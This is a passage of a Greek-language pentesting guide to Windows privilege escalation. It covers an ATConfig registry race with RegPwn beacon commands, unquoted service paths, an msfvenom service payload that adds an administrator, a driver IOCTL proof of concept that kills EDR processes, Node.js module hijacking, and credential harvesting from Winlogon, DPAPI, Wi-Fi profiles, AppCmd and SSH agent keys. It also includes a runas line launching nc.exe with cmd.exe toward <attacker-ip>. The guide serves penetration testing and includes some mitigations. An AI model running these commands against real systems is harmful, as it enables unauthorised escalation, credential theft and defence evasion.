- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` stores user-controlled configuration.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` is created during logon/secure-desktop transitions and is writable by the user.

Abuse flow (CVE-2026-24291 / ATConfig):

1. Populate the **HKCU ATConfig** value you want to be written by SYSTEM.
2. Trigger the secure-desktop copy (e.g., **LockWorkstation**), which starts the AT broker flow.
3. **Win the race** by placing an **oplock** on `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; when the oplock fires, replace the **HKLM Session ATConfig** key with a **registry link** to a protected HKLM target.
4. SYSTEM writes the attacker-chosen value to the redirected HKLM path.

Once you have arbitrary HKLM value write, pivot to LPE by overwriting service configuration values:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Pick a service that a normal user can start (e.g., **`msiserver`**) and trigger it after the write. **Note:** the public exploit implementation **locks the workstation** as part of the race.

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Δικαιώματα Services registry AppendData/AddSubdirectory

Αν έχεις αυτό το permission πάνω σε ένα registry, αυτό σημαίνει ότι **μπορείς να δημιουργήσεις sub registries από αυτό το one**. Στην περίπτωση των Windows services, αυτό είναι **αρκετό για να εκτελέσεις arbitrary code:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Αν το path προς ένα executable δεν είναι μέσα σε quotes, τα Windows θα προσπαθήσουν να εκτελέσουν κάθε ending πριν από ένα space.

Για παράδειγμα, για το path _C:\Program Files\Some Folder\Service.exe_ τα Windows θα προσπαθήσουν να εκτελέσουν:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Λίστα όλων των unquoted service paths, εξαιρώντας αυτά που ανήκουν σε built-in Windows services:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Μπορείς να εντοπίσεις και να εκμεταλλευτείς** αυτήν την ευπάθεια με το metasploit: `exploit/windows/local/trusted\_service\_path` Μπορείς να δημιουργήσεις χειροκίνητα ένα service binary με το metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Ενέργειες Ανάκτησης

Τα Windows επιτρέπουν στους χρήστες να καθορίζουν ενέργειες που θα εκτελούνται αν μια service αποτύχει. Αυτή η δυνατότητα μπορεί να ρυθμιστεί ώστε να δείχνει σε ένα binary. Αν αυτό το binary μπορεί να αντικατασταθεί, μπορεί να είναι δυνατή η privilege escalation. Περισσότερες λεπτομέρειες μπορείτε να βρείτε στην [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Εφαρμογές

### Εγκατεστημένες Εφαρμογές

Ελέγξτε τα **permissions των binaries** (ίσως μπορείτε να αντικαταστήσετε ένα και να κάνετε privilege escalation) και των **φακέλων** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Δικαιώματα Εγγραφής

Ελέγξτε αν μπορείτε να τροποποιήσετε κάποιο config file για να διαβάσετε κάποιο ειδικό αρχείο ή αν μπορείτε να τροποποιήσετε κάποιο binary που πρόκειται να εκτελεστεί από έναν Administrator account (schedtasks).

Ένας τρόπος να βρείτε weak folder/files permissions στο σύστημα είναι κάνοντας:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Το Notepad++ autoloads οποιοδήποτε plugin DLL κάτω από τα `plugins` subfolders του. Αν υπάρχει writable portable/copy install, η τοποθέτηση ενός malicious plugin δίνει automatic code execution μέσα στο `notepad++.exe` σε κάθε launch (including από `DllMain` και plugin callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**Check if you can overwrite some registry or binary that is going to be executed by a different user.**\
**Read** the **following page** to learn more about interesting **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Look for possible **third party weird/vulnerable** drivers
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Αν ένας driver εκθέτει ένα αυθαίρετο kernel read/write primitive (συνηθισμένο σε κακοσχεδιασμένους IOCTL handlers), μπορείς να κάνεις escalation κλέβοντας απευθείας ένα SYSTEM token από kernel memory. Δες τη βήμα-βήμα technique εδώ:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{endref}}

Για race-condition bugs όπου η vulnerable call ανοίγει ένα attacker-controlled Object Manager path, το σκόπιμο slowing της lookup (με max-length components ή deep directory chains) μπορεί να επεκτείνει το window από microseconds σε δεκάδες microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{endref}}

#### Registry hive memory corruption primitives

Τα σύγχρονα hive vulnerabilities επιτρέπουν grooming deterministic layouts, κατάχρηση writable HKLM/HKU descendants και μετατροπή metadata corruption σε kernel paged-pool overflows χωρίς custom driver. Μάθε όλη την αλυσίδα εδώ:

{{#ref}}
windows-registry-hive-exploitation.md
{{endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Κάποιοι signed third‑party drivers δημιουργούν το device object τους με ισχυρό SDDL μέσω IoCreateDeviceSecure αλλά ξεχνούν να ορίσουν FILE_DEVICE_SECURE_OPEN στο DeviceCharacteristics. Χωρίς αυτό το flag, το secure DACL δεν επιβάλλεται όταν το device ανοίγεται μέσω path που περιέχει ένα επιπλέον component, επιτρέποντας σε οποιονδήποτε unprivileged user να αποκτήσει handle χρησιμοποιώντας ένα namespace path όπως:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Μόλις ένας user μπορεί να ανοίξει το device, τα privileged IOCTLs που εκθέτει ο driver μπορούν να abused για LPE και tampering. Ενδεικτικές δυνατότητες που παρατηρήθηκαν in the wild:
- Επιστροφή full-access handles σε αυθαίρετα processes (token theft / SYSTEM shell μέσω DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Τερματισμός αυθαίρετων processes, συμπεριλαμβανομένων Protected Process/Light (PP/PPL), επιτρέποντας AV/EDR kill από user land μέσω kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigations for developers
- Πάντα να ορίζεις FILE_DEVICE_SECURE_OPEN όταν δημιουργείς device objects που προορίζονται να περιοριστούν από ένα DACL.
- Επικύρωσε το caller context για privileged operations. Πρόσθεσε PP/PPL checks πριν επιτρέψεις process termination ή handle returns.
- Περιόρισε τα IOCTLs (access masks, METHOD_*, input validation) και σκέψου brokered models αντί για direct kernel privileges.

Detection ideas for defenders
- Παρακολούθησε user-mode opens ύποπτων device names (π.χ. \\ .\\amsdk*) και συγκεκριμένες ακολουθίες IOCTL που υποδηλώνουν abuse.
- Εφάρμοσε το vulnerable driver blocklist της Microsoft (HVCI/WDAC/Smart App Control) και διατήρησε τα δικά σου allow/deny lists.


## PATH DLL Hijacking

Αν έχεις **write permissions μέσα σε έναν φάκελο που υπάρχει στο PATH** ίσως μπορέσεις να hijack ένα DLL που φορτώνεται από ένα process και να **escalate privileges**.

Έλεγξε τα permissions όλων των φακέλων μέσα στο PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Για περισσότερες πληροφορίες σχετικά με το πώς να abuse αυτόν τον έλεγχο:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking via `C:\node_modules`

Αυτή είναι μια παραλλαγή **Windows uncontrolled search path** που επηρεάζει **Node.js** και **Electron** applications όταν κάνουν ένα bare import όπως `require("foo")` και το αναμενόμενο module **λείπει**.

Το Node επιλύει τα packages ανεβαίνοντας το directory tree και ελέγχοντας `node_modules` folders σε κάθε parent. Στο Windows, αυτό το walk μπορεί να φτάσει μέχρι το drive root, οπότε ένα application που ξεκινά από `C:\Users\Administrator\project\app.js` μπορεί να καταλήξει να ελέγχει:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Αν ένας **low-privileged user** μπορεί να δημιουργήσει το `C:\node_modules`, μπορεί να τοποθετήσει ένα malicious `foo.js` (ή package folder) και να περιμένει ένα **higher-privileged Node/Electron process** να επιλύσει το missing dependency. Το payload εκτελείται στο security context του victim process, οπότε αυτό γίνεται **LPE** όποτε ο target εκτελείται ως administrator, από ένα elevated scheduled task/service wrapper, ή από ένα auto-started privileged desktop app.

Αυτό είναι ιδιαίτερα συνηθισμένο όταν:

- ένα dependency δηλώνεται σε `optionalDependencies`
- ένα third-party library τυλίγει το `require("foo")` σε `try/catch` και συνεχίζει μετά από failure
- ένα package αφαιρέθηκε από production builds, παραλείφθηκε κατά το packaging, ή απέτυχε να εγκατασταθεί
- το vulnerable `require()` βρίσκεται βαθιά μέσα στο dependency tree αντί για το main application code

### Hunting vulnerable targets

Χρησιμοποιήστε **Procmon** για να αποδείξετε το resolution path:

- Filter by `Process Name` = target executable (`node.exe`, το Electron app EXE, ή το wrapper process)
- Filter by `Path` `contains` `node_modules`
- Εστιάστε στο `NAME NOT FOUND` και στο τελικό successful open κάτω από `C:\node_modules`

Χρήσιμα code-review patterns σε unpacked `.asar` files ή application sources:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Εκμετάλλευση

1. Identify the **missing package name** from Procmon or source review.
2. Δημιουργήστε τον root lookup directory αν δεν υπάρχει ήδη:
```powershell
mkdir C:\node_modules
```
3. Ρίξε ένα module με το ακριβές αναμενόμενο όνομα:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Ενεργοποίησε την εφαρμογή-θύμα. Αν η εφαρμογή επιχειρήσει `require("foo")` και το νόμιμο module απουσιάζει, το Node μπορεί να φορτώσει `C:\node_modules\foo.js`.

Πραγματικά παραδείγματα από ελλείποντα optional modules που ταιριάζουν σε αυτό το μοτίβο περιλαμβάνουν τα `bluebird` και `utf-8-validate`, αλλά η **technique** είναι το επαναχρησιμοποιήσιμο μέρος: βρες οποιοδήποτε **missing bare import** που ένα privileged Windows Node/Electron process θα επιλύσει.

### Ιδέες για detection and hardening

- Κάνε alert όταν ένας χρήστης δημιουργεί `C:\node_modules` ή γράφει νέα `.js` files/packages εκεί.
- Αναζήτησε high-integrity processes που διαβάζουν από `C:\node_modules\*`.
- Πακέταρε όλα τα runtime dependencies σε production και κάνε audit στη χρήση του `optionalDependencies`.
- Εξέτασε third-party code για αθόρυβα μοτίβα `try { require("...") } catch {}`.
- Απενεργοποίησε optional probes όταν το υποστηρίζει η library (για παράδειγμα, ορισμένα `ws` deployments μπορούν να αποφύγουν το legacy `utf-8-validate` probe με `WS_NO_UTF_8_VALIDATE=1`).

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Έλεγξε για άλλους γνωστούς υπολογιστές που είναι hardcoded στο hosts file
```
type C:\Windows\System32\drivers\etc\hosts
```
### Διεπαφές Δικτύου & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Ανοιχτές Θύρες

Ελέγξτε για **restricted services** από έξω
```bash
netstat -ano #Opened ports?
```
### Πίνακας δρομολόγησης
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Πίνακας ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Κανόνες Firewall

[**Ελέγξτε αυτή τη σελίδα για εντολές σχετικές με το Firewall**](../basic-cmd-for-pentesters.md#firewall) **(λίστα κανόνων, δημιουργία κανόνων, απενεργοποίηση, απενεργοποίηση...)**

Περισσότερες [εντολές για network enumeration εδώ](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Το binary `bash.exe` μπορεί επίσης να βρεθεί στο `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Αν αποκτήσετε root user, μπορείτε να ακούσετε σε οποιαδήποτε port (την πρώτη φορά που χρησιμοποιείτε το `nc.exe` για να ακούσετε σε ένα port, θα σας ζητήσει μέσω GUI αν το `nc` πρέπει να επιτραπεί από το firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Για να ξεκινήσετε εύκολα το bash ως root, μπορείτε να δοκιμάσετε `--default-user root`

Μπορείτε να εξερευνήσετε το `WSL` filesystem στον φάκελο `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

Από [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Το Windows Vault αποθηκεύει credentials χρηστών για servers, websites και άλλα programs που τα **Windows** μπορούν να **log in the users automaticall**y. Με την πρώτη ματιά, αυτό μπορεί να μοιάζει σαν οι χρήστες να μπορούν να αποθηκεύουν τα Facebook credentials τους, Twitter credentials, Gmail credentials κ.λπ., ώστε να γίνεται αυτόματα login μέσω browsers. Αλλά δεν είναι έτσι.

Το Windows Vault αποθηκεύει credentials στα οποία τα Windows μπορούν να κάνουν automatic login στους users, πράγμα που σημαίνει ότι οποιαδήποτε **Windows application that needs credentials to access a resource** (server ή website) **can make use of this Credential Manager** & Windows Vault και να χρησιμοποιεί τα credentials που παρέχονται αντί να πληκτρολογούν οι χρήστες συνεχώς το username και το password.

Εκτός αν οι applications αλληλεπιδρούν με το Credential Manager, δεν νομίζω ότι είναι δυνατό να χρησιμοποιήσουν τα credentials για έναν συγκεκριμένο resource. Άρα, αν η application σου θέλει να κάνει χρήση του vault, θα πρέπει με κάποιον τρόπο να **communicate with the credential manager and request the credentials for that resource** από το default storage vault.

Χρησιμοποίησε το `cmdkey` για να εμφανίσεις τα stored credentials στο machine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Στη συνέχεια, μπορείτε να χρησιμοποιήσετε το `runas` με τις επιλογές `/savecred` για να χρησιμοποιήσετε τα αποθηκευμένα credentials. Το ακόλουθο παράδειγμα καλεί ένα remote binary μέσω ενός SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Χρησιμοποιώντας το `runas` με ένα δοσμένο σύνολο credentials.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

Το **Data Protection API (DPAPI)** παρέχει μια μέθοδο συμμετρικής κρυπτογράφησης δεδομένων, που χρησιμοποιείται κυρίως στο λειτουργικό σύστημα Windows για τη συμμετρική κρυπτογράφηση ασύμμετρων ιδιωτικών κλειδιών. Αυτή η κρυπτογράφηση αξιοποιεί ένα μυστικό χρήστη ή συστήματος για να συμβάλει σημαντικά στην εντροπία.

**Το DPAPI επιτρέπει την κρυπτογράφηση κλειδιών μέσω ενός συμμετρικού κλειδιού που παράγεται από τα μυστικά σύνδεσης του χρήστη**. Σε σενάρια που αφορούν κρυπτογράφηση συστήματος, χρησιμοποιεί τα μυστικά ελέγχου ταυτότητας του domain του συστήματος.

Τα κρυπτογραφημένα RSA keys του χρήστη, μέσω DPAPI, αποθηκεύονται στον κατάλογο `%APPDATA%\Microsoft\Protect\{SID}`, όπου το `{SID}` αντιπροσωπεύει το [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) του χρήστη. **Το DPAPI key, που βρίσκεται μαζί με το master key και προστατεύει τα ιδιωτικά κλειδιά του χρήστη στο ίδιο αρχείο**, συνήθως αποτελείται από 64 bytes τυχαίων δεδομένων. (Είναι σημαντικό να σημειωθεί ότι η πρόσβαση σε αυτόν τον κατάλογο είναι περιορισμένη, αποτρέποντας την εμφάνιση του περιεχομένου του με την εντολή `dir` στο CMD, αν και μπορεί να εμφανιστεί μέσω PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Μπορείτε να χρησιμοποιήσετε το **mimikatz module** `dpapi::masterkey` με τα κατάλληλα arguments (`/pvk` ή `/rpc`) για να το decrypt.

Τα **credentials files protected by the master password** συνήθως βρίσκονται στο:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt.\
You can **extract many DPAPI** **masterkeys** from **memory** with the `sekurlsa::dpapi` module (if you are root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** χρησιμοποιούνται συχνά για **scripting** και automation tasks ως τρόπος να αποθηκεύονται κρυπτογραφημένα credentials με βολικό τρόπο. Τα credentials προστατεύονται χρησιμοποιώντας **DPAPI**, κάτι που συνήθως σημαίνει ότι μπορούν να αποκρυπτογραφηθούν μόνο από τον ίδιο χρήστη στον ίδιο υπολογιστή όπου δημιουργήθηκαν.

Για να **decrypt** ένα PS credentials από το αρχείο που το περιέχει μπορείτε να κάνετε:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Αποθηκευμένες συνδέσεις RDP

Μπορείς να τις βρεις στο `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
και στο `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Πρόσφατα εκτελεσμένες εντολές
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remote Desktop Credential Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Χρησιμοποιήστε τη μονάδα **Mimikatz** `dpapi::rdg` με το κατάλληλο `/masterkey` για να **αποκρυπτογραφήσετε οποιαδήποτε αρχεία .rdg**\
Μπορείτε να **εξαγάγετε πολλά DPAPI masterkeys** από τη μνήμη με τη μονάδα `sekurlsa::dpapi` του Mimikatz

### Sticky Notes

Οι χρήστες συχνά χρησιμοποιούν την εφαρμογή StickyNotes σε Windows workstations για να **αποθηκεύουν passwords** και άλλες πληροφορίες, χωρίς να συνειδητοποιούν ότι πρόκειται για ένα αρχείο βάσης δεδομένων. Αυτό το αρχείο βρίσκεται στο `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` και αξίζει πάντα να το αναζητάτε και να το εξετάζετε.

### AppCmd.exe

**Σημειώστε ότι για να ανακτήσετε passwords από το AppCmd.exe πρέπει να είστε Administrator και να εκτελείτε υπό High Integrity level.**\
**AppCmd.exe** βρίσκεται στον κατάλογο `%systemroot%\system32\inetsrv\`.\
Αν αυτό το αρχείο υπάρχει, τότε είναι πιθανό να έχουν ρυθμιστεί ορισμένα **credentials** και να μπορούν να **ανακτηθούν**.

Αυτός ο κώδικας εξήχθη από το [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Ελέγξτε αν υπάρχει το `C:\Windows\CCM\SCClient.exe` .\
Οι installers **εκτελούνται με δικαιώματα SYSTEM**, πολλοί είναι ευάλωτοι σε **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Αρχεία και Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Κλειδιά Host SSH του Putty
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Κλειδιά SSH στο registry

Τα private SSH keys μπορούν να αποθηκευτούν μέσα στο registry key `HKCU\Software\OpenSSH\Agent\Keys`, οπότε θα πρέπει να ελέγξετε αν υπάρχει κάτι ενδιαφέρον εκεί:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Αν βρείτε οποιαδήποτε καταχώρηση μέσα σε εκείνο το path, πιθανότατα θα είναι ένα αποθηκευμένο SSH key. Είναι αποθηκευμένο κρυπτογραφημένο αλλά μπορεί εύκολα να αποκρυπτογραφηθεί χρησιμοποιώντας [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Περισσότερες πληροφορίες σχετικά με αυτήν την τεχνική εδώ: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Αν η υπηρεσία `ssh-agent` δεν εκτελείται και θέλετε να ξεκινά αυτόματα στο boot εκτελέστε:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
